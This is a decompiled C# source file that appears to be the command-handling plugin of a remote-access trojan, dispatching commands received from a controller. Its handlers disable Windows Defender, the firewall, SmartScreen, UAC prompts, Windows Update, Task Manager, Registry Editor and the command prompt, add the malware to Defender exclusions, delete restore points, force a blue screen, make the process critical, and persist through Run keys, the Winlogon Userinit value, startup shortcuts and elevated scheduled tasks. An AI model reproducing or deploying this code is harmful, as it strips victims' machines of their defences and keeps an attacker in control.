using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Leb128;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using Plugin.Properties;

namespace Plugin;

internal class Packet
{
	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SystemParametersInfoA", ExactSpelling = true, SetLastError = true)]
	public static extern int SystemParametersInfo(int uAction, int uParam, int pvParam, int fWinIni);

	public static void Read(byte[] data)
	{
		try
		{
			string text = (string)LEB128.Read(data)[0];
			if (text == null)
			{
				return;
			}
			switch (text.Length)
			{
			case 9:
				switch (text[0])
				{
				case 'E':
					if (text == "Exclusion")
					{
						WindowsDefenderExclusion.Exc(Process.GetCurrentProcess().MainModule.FileName);
					}
					break;
				case 'D':
					if (!(text == "Defender+"))
					{
						if (text == "Defender-")
						{
							WindowsDefender.Run(Resource1.Disable);
						}
					}
					else
					{
						WindowsDefender.Run(Resource1.Enable);
					}
					break;
				case 'F':
					if (!(text == "FireWall+"))
					{
						if (text == "FireWall-")
						{
							ShellVerb("netsh advfirewall set allprofiles state off");
						}
					}
					else
					{
						ShellVerb("netsh advfirewall set allprofiles state on");
					}
					break;
				}
				break;
			case 4:
				switch (text[0])
				{
				case 'N':
					if (text == "Net3")
					{
						InstallNet3();
					}
					break;
				case 'B':
					if (text == "BSOD")
					{
						BSOD.Run();
					}
					break;
				case 'U':
					if (!(text == "Uac+"))
					{
						if (text == "Uac-")
						{
							Regedit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "ConsentPromptBehaviorAdmin", 1);
						}
					}
					else
					{
						Regedit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "ConsentPromptBehaviorAdmin", 0);
					}
					break;
				case 'C':
					if (!(text == "Cmd+"))
					{
						if (text == "Cmd-")
						{
							Regedit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "DisableCMD", 1);
						}
					}
					else
					{
						Regedit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "DisableCMD", 0);
					}
					break;
				}
				break;
			case 12:
				switch (text[11])
				{
				case 's':
					if (text == "DeletePoints")
					{
						DeletePoints.Run();
					}
					break;
				case '+':
					if (text == "SmartScreen+")
					{
						Regedit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "SmartScreenEnabled", "on");
					}
					break;
				case '-':
					if (text == "SmartScreen-")
					{
						Regedit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "SmartScreenEnabled", "off");
					}
					break;
				case 't':
					if (text == "CriticalExit")
					{
						ProcessCritical.Exit();
					}
					break;
				}
				break;
			case 10:
				switch (text[2])
				{
				case 's':
					if (text == "ResetScale")
					{
						SystemParametersInfo(159, 0, 0, 1);
					}
					break;
				case 'g':
					if (text == "RegMachine")
					{
						RegeditHklm("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName), Process.GetCurrentProcess().MainModule.FileName);
					}
					break;
				}
				break;
			case 8:
				switch (text[0])
				{
				case 'T':
					if (!(text == "TaskMgr+"))
					{
						if (text == "TaskMgr-")
						{
							Regedit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 1);
						}
					}
					else
					{
						Regedit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", 0);
					}
					break;
				case 'R':
					if (!(text == "Regedit+"))
					{
						if (text == "Regedit-")
						{
							Regedit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 1);
						}
					}
					else
					{
						Regedit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", 0);
					}
					break;
				case 'U':
					if (!(text == "Updates+"))
					{
						if (text == "Updates-")
						{
							ShellVerb("sc stop wuauserv");
							ShellVerb("sc config wuauserv start=disabled");
						}
					}
					else
					{
						ShellVerb("sc config wuauserv start=auto");
						ShellVerb("sc start wuauserv");
					}
					break;
				case 'S':
					break;
				}
				break;
			case 5:
				switch (text[4])
				{
				case '+':
					if (text == "WinR+")
					{
						Regedit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRun", 0);
					}
					break;
				case '-':
					if (text == "WinR-")
					{
						Regedit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoRun", 1);
					}
					break;
				}
				break;
			case 7:
				switch (text[1])
				{
				case 't':
					if (text == "Startup")
					{
						CreateShortcut();
					}
					break;
				case 'c':
					if (text == "Schtask")
					{
						Shell("schtasks /create /sc onlogon /tn \"" + Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName) + "\" /tr \"" + Process.GetCurrentProcess().MainModule.FileName + "\"");
					}
					break;
				case 'e':
					if (text == "RegUser")
					{
						RegeditHkcu("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName), Process.GetCurrentProcess().MainModule.FileName);
					}
					break;
				}
				break;
			case 11:
				switch (text[0])
				{
				case 'R':
					if (text == "RegUserinit")
					{
						RegeditHklm("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\winlogon", "Userinit", "C:\\Windows\\System32\\userinit.exe," + Process.GetCurrentProcess().MainModule.FileName);
					}
					break;
				case 'C':
					if (text == "CriticalSet")
					{
						ProcessCritical.Set();
					}
					break;
				}
				break;
			case 14:
				if (text == "SchtaskHighest")
				{
					Shell("schtasks /create /sc onlogon /tn \"" + Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName) + "\" /tr \"" + Process.GetCurrentProcess().MainModule.FileName + "\" /rl highest");
				}
				break;
			case 6:
			case 13:
				break;
			}
		}
		catch
		{
		}
	}

	public static void CreateShortcut()
	{
		try
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName) + ".lnk");
			object obj = Interaction.CreateObject("WScript.Shell", "");
			object obj2 = null;
			obj2 = Interaction.CallByName(obj, "CreateShortcut", (CallType)1, new object[1] { text });
			Interaction.CallByName(obj2, "TargetPath", (CallType)4, new object[1] { Process.GetCurrentProcess().MainModule.FileName });
			Interaction.CallByName(obj2, "WorkingDirectory", (CallType)4, new object[1] { "" });
			Interaction.CallByName(obj2, "Save", (CallType)1, new object[0]);
		}
		catch
		{
		}
	}

	public static void InstallNet3()
	{
		if (Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\.NETFramework\\Policy\\v2.0\\50727") == null)
		{
			ShellVerb("DISM.exe /Online /Enable-Feature /FeatureName:NetFx3 /All");
		}
	}

	public static void Shell(string command)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = "cmd";
		processStartInfo.Arguments = "/c " + command;
		processStartInfo.Arguments += " && exit";
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	public static void ShellVerb(string command)
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "cmd";
			processStartInfo.Arguments = "/c " + command;
			processStartInfo.Verb = "runas";
			processStartInfo.Arguments += " && exit";
			Process process = new Process();
			process.StartInfo = processStartInfo;
			process.Start();
		}
	}

	public static void Regedit(string key, string name, object value)
	{
		RegeditHkcu(key, name, value);
		RegeditHklm(key, name, value);
	}

	public static void RegeditHkcu(string key, string name, object value)
	{
		using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(key, writable: true);
		registryKey.SetValue(name, value);
	}

	public static void RegeditHklm(string key, string name, object value)
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(key, writable: true);
		registryKey.SetValue(name, value);
	}
}
